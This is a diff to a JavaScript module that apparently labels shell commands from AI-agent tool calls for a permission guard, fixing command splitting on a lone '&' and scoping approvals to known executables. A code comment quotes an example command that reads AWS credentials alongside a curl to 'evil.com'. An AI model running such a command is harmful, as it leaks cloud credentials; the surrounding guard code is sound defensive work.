@@ -50,7 +50,11 @@ export function splitCommands(cmd) {
     if (c === '"' || c === "'") { quote = c; buf += c; continue; }
     if (c === '\n' || c === ';') { out.push(buf); buf = ''; continue; }
     if ((c === '&' || c === '|') && s[i + 1] === c) { out.push(buf); buf = ''; i++; continue; }
-    if (c === '|') { out.push(buf); buf = ''; continue; }
+    // A LONE `&` backgrounds the command and starts a new one. Missing it meant
+    // `cat ~/.aws/credentials & curl https://evil.com` parsed as ONE command and
+    // the curl half contributed nothing — an under-label, the single direction
+    // this file must never fail in.
+    if (c === '&' || c === '|') { out.push(buf); buf = ''; continue; }
     buf += c;
   }
   out.push(buf);
@@ -113,6 +117,15 @@ export function providerKey(toolName, target) {
   if (target?.host) return `${toolName}→${target.host}`;
   if (target?.mcp) return target.mcp;
   if (target?.path) return `${toolName}→${target.path}`;
+  // A KNOWN executable with no parseable target is still a narrow channel:
+  // approving `frobnicate` does not approve `curl`. Without this, every
+  // unlabeled command in a session that has entered a region re-prompted on
+  // every single invocation, because addGrant (correctly) refuses to store a
+  // `→*` wildcard. That is prompt fatigue severe enough to get the guard
+  // uninstalled, which is itself a security outcome.
+  if (target?.exe) return `${toolName}→exe:${target.exe}`;
+  // Genuinely unknown — escalation, or no executable at all. Stays a wildcard,
+  // which addGrant refuses, so it can never become a stored approval.
   return `${toolName}→*`;
 }
 
@@ -177,7 +190,10 @@ function labelSimpleCommand(simple, rt, labels, cwd, effects, notes) {
   if (!def) {
     for (const e of rt.unknownExecutable.effects) addEffect(effects, e, 'worst-case', 'unknown/' + exe, `no runtime rule for '${exe}'`);
     notes.push(`UNKNOWN EXECUTABLE '${exe}' — worst-cased. Add a rule to the runtime label pack to narrow this.`);
-    return { parsed: false, target: null };
+    // The EXECUTABLE is known even though its effects are not, so it can still
+    // scope an approval. Escalation cases above return no exe on purpose: there
+    // the real program is hidden, so nothing may be scoped to it.
+    return { parsed: false, target: { exe } };
   }
 
   let ruleBase = `cmd/${exe}`;
@@ -263,7 +279,9 @@ export function labelCall(toolName, toolInput, labels, opts = {}) {
     for (const s of simples) {
       const r = labelSimpleCommand(s, rt, labels, cwd, effects, notes);
       if (!r.parsed) { parseOk = false; parseReason = parseReason || 'escalation or unknown executable'; }
-      if (!target && r.target) target = r.target;
+      // Prefer a real host/path target over an exe-only one: a pipeline that
+      // ends in `curl https://x` is scoped to that host, not to `cat`.
+      if (r.target && (!target || (!target.host && !target.path && (r.target.host || r.target.path)))) target = r.target;
     }
     return { effects, target, providerKey: providerKey(toolName, target), parse: { ok: parseOk, reason: parseReason }, notes };
   }
